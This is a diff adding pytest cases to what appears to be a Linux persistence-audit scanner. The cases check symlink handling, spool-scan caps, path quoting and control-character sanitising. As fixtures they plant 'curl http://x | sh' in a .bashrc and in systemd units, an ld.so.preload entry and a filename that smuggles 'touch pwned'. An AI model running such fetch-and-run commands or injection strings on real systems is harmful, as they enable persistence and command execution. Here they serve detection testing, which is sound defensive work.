@@ -281,3 +281,66 @@ def test_offline_ordinary_disk_has_no_warnings(linux_disk):
 
 def test_offline_capable_flag():
     assert _get_module().offline_capable is True
+
+
+def test_offline_symlinked_ld_preload_is_reported_as_etc_ld_so_preload(linux_disk):
+    (linux_disk / "usr/lib").mkdir(parents=True)
+    (linux_disk / "usr/lib/pre").write_text("/usr/lib/libevil.so\n")
+    (linux_disk / "etc/ld.so.preload").symlink_to("/usr/lib/pre")
+    r = _get_module().check(_offline(linux_disk))
+    hit = [f for f in r.findings if f.code == "security.linux_persistence_audit.ld_preload_set"]
+    assert hit and hit[0].data["path"] == "/etc/ld.so.preload"
+    assert "/etc/ld.so.preload lists" in hit[0].description
+
+
+def test_offline_symlinked_bashrc_shown_at_its_own_path(linux_disk):
+    (linux_disk / "home/sam/dotfiles").mkdir()
+    (linux_disk / "home/sam/dotfiles/bashrc").write_text("curl http://x | sh\n")
+    (linux_disk / "home/sam/.bashrc").symlink_to("dotfiles/bashrc")
+    r = _get_module().check(_offline(linux_disk))
+    hit = [f for f in r.findings if f.code == _SUSP]
+    assert hit and hit[0].data["path"] == "/home/sam/.bashrc"
+
+
+def test_offline_symlinked_walk_root_shown_at_its_own_path(linux_disk):
+    (linux_disk / "opt/units").mkdir(parents=True)
+    (linux_disk / "opt/units/u.service").write_text("ExecStart=curl http://x | sh\n")
+    (linux_disk / "usr/local/lib/systemd").mkdir(parents=True)
+    (linux_disk / "usr/local/lib/systemd/system").symlink_to("/opt/units")
+    r = _get_module().check(_offline(linux_disk))
+    hit = [f for f in r.findings if f.code == _SUSP]
+    assert hit and hit[0].data["path"] == "/usr/local/lib/systemd/system/u.service"
+
+
+def test_offline_spool_scan_is_capped(linux_disk):
+    spool = linux_disk / "var/spool/cron/crontabs"
+    spool.mkdir(parents=True)
+    for i in range(10):
+        (spool / f"u{i}").write_text("* * * * * true\n")
+    mod = _get_module()
+    mod.max_files = 3
+    r = mod.check(_offline(linux_disk))
+    inv = next(f for f in r.findings if f.data.get("check") == "inventory")
+    assert len([e for e in inv.data["entries"] if e["kind"] == "user crontab"]) <= 3
+
+
+def test_offline_hostile_filename_is_quoted_in_guidance(linux_disk):
+    name = "x'; touch pwned; '.service"
+    (linux_disk / "etc/systemd/system" / name).write_text("ExecStart=curl http://x | sh\n")
+    mod = _get_module()
+    r = mod.check(_offline(linux_disk))
+    hit = [f for f in r.findings if f.code == _SUSP]
+    assert hit
+    actions = mod.fix(r, Mode.GUIDED if hasattr(Mode, "GUIDED") else list(Mode)[0]).actions
+    from shlex import quote
+    path = hit[0].data["path"]
+    text = "\n".join(a.description for a in actions)
+    assert f"cat {quote(path)}" in text
+    assert f"cat '{path}'" not in text
+
+
+def test_offline_control_characters_in_path_are_replaced(linux_disk):
+    (linux_disk / "etc/systemd/system" / "a\nb.service").write_text("ExecStart=curl http://x | sh\n")
+    r = _get_module().check(_offline(linux_disk))
+    hit = [f for f in r.findings if f.code == _SUSP]
+    assert hit and "\n" not in hit[0].data["path"] and "a?b.service" in hit[0].data["path"]
